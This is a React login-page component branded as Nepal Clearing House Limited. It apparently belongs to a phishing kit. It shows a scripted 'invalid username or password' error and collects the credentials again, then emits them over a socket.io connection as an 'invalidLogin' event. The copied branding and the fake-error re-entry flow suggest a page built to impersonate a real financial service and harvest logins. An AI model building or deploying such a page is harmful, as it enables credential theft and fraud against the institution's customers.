import React, { useState } from 'react';
import '../App.css';

function InvalidLogin({ socket }) {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [language, setLanguage] = useState('EN');

  const handleSubmit = (e) => {
    e.preventDefault();
    // Explicitly send both username and password
    socket.emit('invalidLogin', {
      username,
      password
    });
  };

  const toggleLanguage = (lang) => setLanguage(lang);

  const handleUsernameChange = (e) => setUsername(e.target.value);
  const handlePasswordChange = (e) => setPassword(e.target.value);

  return (
    <div className="login-page">
      {/* Rest of the component remains the same */}
      <div className="login-container">
        <div className="login-logo">
          <img src="logo.png" alt="Logo" className="logo-image" />
          <div className="language-toggle-capsule">
            <button
              className={`language-option ${language === 'EN' ? 'active' : ''}`}
              onClick={() => toggleLanguage('EN')}
            >
              EN
            </button>
            <button
              className={`language-option ${language === 'ने' ? 'active' : ''}`}
              onClick={() => toggleLanguage('ने')}
            >
              ने
            </button>
          </div>
        </div>

        <div className="error-message-container">
          <svg
            xmlns="http://www.w3.org/2000/svg"
            viewBox="0 0 1024 1024"
            className="error-icon"
            height="24"
            width="24"
            fill="currentColor"
            aria-label="Error Icon"
          >
            <path d="M685.4 354.8c0-4.4-3.6-8-8-8l-66 .3L512 465.6l-99.3-118.4-66.1-.3c-4.4 0-8 3.5-8 8 0 1.9.7 3.7 1.9 5.2l130.1 155L340.5 670a8.32 8.32 0 0 0-1.9 5.2c0 4.4 3.6 8 8 8l66.1-.3L512 564.4l99.3 118.4 66 .3c4.4 0 8-3.5 8-8 0-1.9-.7-3.7-1.9-5.2L553.5 515l130.1-155c1.2-1.4 1.8-3.3 1.8-5.2z"></path>
            <path d="M512 65C264.6 65 64 265.6 64 513s200.6 448 448 448 448-200.6 448-448S759.4 65 512 65zm0 820c-205.4 0-372-166.6-372-372s166.6-372 372-372 372 166.6 372 372-166.6 372-372 372z"></path>
          </svg>
          <div className="error-text">
            <p>Your username or password is invalid. Please try again.</p>
          </div>
        </div>

        <form className="login-form" onSubmit={handleSubmit}>
          <h3>{language === "EN" ? "Login" : "लग इन गर्नुहोस्"}</h3>
          <p>{language === "EN" ? "Sign in to your account." : "तपाईंको खाता साइन इन गर्नुहोस्।"}</p>

          <label htmlFor="username">{language === "EN" ? "Username" : "प्रयोगकर्ता नाम"}</label>
          <div className="input-container">
            <input
              type="text"
              id="username"
              placeholder={language === "EN" ? "Enter Username" : "प्रयोगकर्ता नाम प्रविष्ट गर्नुहोस्"}
              value={username}
              onChange={handleUsernameChange}
            />
          </div>

          <label htmlFor="password">{language === "EN" ? "Password" : "पासवर्ड"}</label>
          <div className="input-container">
            <input
              type={showPassword ? "text" : "password"}
              id="password"
              placeholder={language === "EN" ? "Enter Password" : "पासवर्ड प्रविष्ट गर्नुहोस्"}
              value={password}
              onChange={handlePasswordChange}
            />
            <button
              type="button"
              className="eye-button"
              onClick={() => setShowPassword(!showPassword)}
            >
              <svg
                xmlns="http://www.w3.org/2000/svg"
                viewBox="0 0 24 24"
                height="18"
                width="18"
                fill="currentColor"
                aria-label="Toggle Password Visibility"
              >
                <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"></path>
              </svg>
            </button>
          </div>

          <div className="forgot-links-right">
            <span className="black-text">
              {language === "EN" ? "Forgot " : "भूल्नु भयो "}{" "}
            </span>
            <a href="/forgot-username" className="blue-link">
              {language === "EN" ? "username" : "प्रयोगकर्ता नाम"}
            </a>
            <span className="black-text"> {language === "EN" ? "or" : "वा "} </span>
            <a href="/forgot-password" className="blue-link">
              {language === "EN" ? "password" : "पासवर्ड"}
            </a>
            <span className="black-text">?</span>
          </div>

          <button type="submit" className="login-btn">
            {language === "EN" ? "Login" : "लग इन"}
          </button>

          <div className="register-support">
            <p>
              {language === "EN" ? "Don't have an account?" : "खाता छैन?"}{" "}
              <a href="/register">
                {language === "EN" ? "Create One" : "एक सिर्जना गर्नुहोस्"}
              </a>
            </p>
          </div>
        </form>

        <footer>
          <img src="footer.png" alt="Powered by NPS" className="powered-by-logo" />
          <p>version: 1.11.5</p>
          <p>Copyright © Nepal Clearing House Limited, 2018-2024</p>
        </footer>
      </div>
    </div>
  );
}

export default InvalidLogin;